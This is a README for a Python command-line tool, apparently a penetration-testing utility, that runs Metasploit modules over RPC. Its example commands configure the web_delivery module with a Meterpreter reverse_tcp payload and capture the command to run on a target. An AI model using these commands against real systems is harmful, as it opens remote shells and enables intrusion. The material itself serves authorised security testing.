# MSF Module Executor

This project provides a command-line interface (CLI) tool built in Python that interacts with the Metasploit Framework using the `pymetasploit3` library. The tool allows you to dynamically run any Metasploit module, set options, and filter output based on a regular expression.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
  - [Basic Usage](#basic-usage)
  - [Advanced Usage](#advanced-usage)
- [Arguments](#arguments)
- [Examples](#examples)
- [Logging and Error Handling](#logging-and-error-handling)
- [License](#license)

## Installation

### Prerequisites

1. **Python 3.6+** is required.
2. **Metasploit Framework** installed on a host.
3. **Metasploit RPC Server** running and configured to allow connections.

### Setting Up the Environment

1. Clone the repository:

    ```bash
    git clone https://github.com/your-username/msf-module-executor.git
    cd msf-module-executor
    ```

2. Install the required Python packages:

    ```bash
    pip install pymetasploit3 argparse
    ```

## Usage

### Basic Usage

To run an exploit with the tool, specify the Metasploit module and options:

```bash
python3 metasploit_runner.py <module> --option <OPTION=VALUE> [...] --rpc-server <RPC_SERVER> --rpc-port <RPC_PORT>
```

### Advanced Usage

You can also filter the output using a regular expression:

```bash
python3 metasploit_runner.py <module> --option <OPTION=VALUE> [...] --regex "<REGEX_PATTERN>" --rpc-server <RPC_SERVER> --rpc-port <RPC_PORT>
```

### Arguments

- `<module>`: The Metasploit module to use, e.g., `exploit/multi/script/web_delivery`.
- `--option <OPTION=VALUE>`: Specify options for the module in `OPTION=VALUE` format. Multiple `--option` arguments can be passed.
- `--msf-password <PASSWORD>`: The password for the Metasploit RPC server (default: `msfrpc`).
- `--rpc-server <RPC_SERVER>`: The IP address or hostname of the Metasploit RPC server (default: `127.0.0.1`).
- `--rpc-port <RPC_PORT>`: The port on which the Metasploit RPC server is listening (default: `55552`).
- `--regex <REGEX_PATTERN>`: A regex pattern to filter the output. If not provided, the default pattern captures commands for the target machine.

## Examples

### Run a Basic Exploit

```bash
python3 metasploit_runner.py exploit/multi/script/web_delivery --option LHOST=10.192.0.3 --option LPORT=4450 --option SRVHOST=0.0.0.0 --option SRVPORT=8090 --option URIPATH=/mypayload --option payload=python/meterpreter/reverse_tcp --rpc-server 10.192.0.3 --rpc-port 55552
```

### Filter Output with a Custom Regex

```bash
python3 metasploit_runner.py exploit/multi/script/web_delivery --option LHOST=10.192.0.3 --option LPORT=4450 --option SRVHOST=0.0.0.0 --option SRVPORT=8090 --option URIPATH=/mypayload --option payload=python/meterpreter/reverse_tcp --regex "Run the following command on the target machine:\n(.*)" --rpc-server 10.192.0.3 --rpc-port 55552
```

## Logging and Error Handling

- **Logging**: The script logs detailed information about each step, including connection setup, option setting, and command execution.
- **Error Handling**: The script includes error handling for common issues such as connection failures to the Metasploit RPC server.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
